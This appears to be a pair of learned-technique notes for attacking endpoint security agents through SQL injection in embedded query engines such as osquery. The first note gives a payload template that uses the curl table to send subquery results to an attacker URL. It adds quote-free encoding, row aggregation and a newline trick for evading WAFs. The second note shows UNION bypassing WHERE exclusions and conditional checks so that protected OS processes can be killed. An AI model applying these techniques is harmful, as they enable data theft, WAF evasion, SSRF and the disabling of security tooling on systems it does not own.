### Blind SQLi to Full Exfil via Query Engine Side-Channel Tables (learned 2026-04-09)
**When to apply**: Application builds SQL for an embedded query engine (osquery, SQLite, DuckDB, Presto, etc.) using string concatenation, AND the query engine has virtual tables with network side effects (e.g. osquery `curl`, SQLite `http`, DuckDB `httpfs`, Presto connectors).
**Technique**: Even when injection results are never returned to the attacker (blind — used only for internal logic like a kill list), check if the query engine has tables that perform outbound HTTP requests. Chain `UNION SELECT result,0 FROM curl WHERE url=<attacker>||(<subquery>)` to turn blind injection into full OOB data exfiltration. Use `char()` to build URL strings without quotes (avoids nested quote conflicts). Use `REPLACE()` to sanitize exfiltrated data (`\`, space, `%`) for URL safety. Use `GROUP_CONCAT(a||':'||b, ',')` (2-arg form) to aggregate multiple rows into one request. When WAF blocks classic patterns like `' AND`, use `\n` (newlines) between SQL keywords as whitespace — most WAFs don't parse across newlines but SQLite treats them as valid whitespace.
**Example**: EDR agent built osquery SQL from admin-pushed rules without escaping. Query results fed a process kill list (blind). osquery's `curl` table (enabled by default) allowed `UNION SELECT` to make HTTP requests to attacker server with data from `users`, `registry`, `processes`, `interface_addresses` tables. Cloudflare WAF bypassed via newline-separated keywords. Also chained to SSRF against internal services.

### SQL Safety Mechanisms in WHERE Are Bypassed by UNION (learned 2026-04-09)
**When to apply**: Application has SQL injection AND the query includes WHERE-clause safety filters (e.g. `WHERE path NOT LIKE 'System32%'` to exclude sensitive rows). The application also has post-query safety checks that are conditional (only run for certain rule types).
**Technique**: UNION SELECT has its own independent WHERE clause that does NOT inherit the exclusions from the first SELECT. If the app filters out dangerous rows via `WHERE NOT LIKE`, a UNION bypasses this entirely. Additionally, check if post-query safety checks (PID validation, signature verification) are behind conditional flags — if the injection occurs through a rule type that doesn't set the flag, ALL post-query checks are skipped and every UNION row goes straight to the dangerous operation.
**Example**: Software blocking excluded System32 processes via SQL WHERE clause and had PID/signature checks in Go code. But UNION bypassed the SQL exclusion, and path/name rule types set `isSignatureChecked=false`, skipping all Go-side checks. Attacker could kill any process including protected OS services.
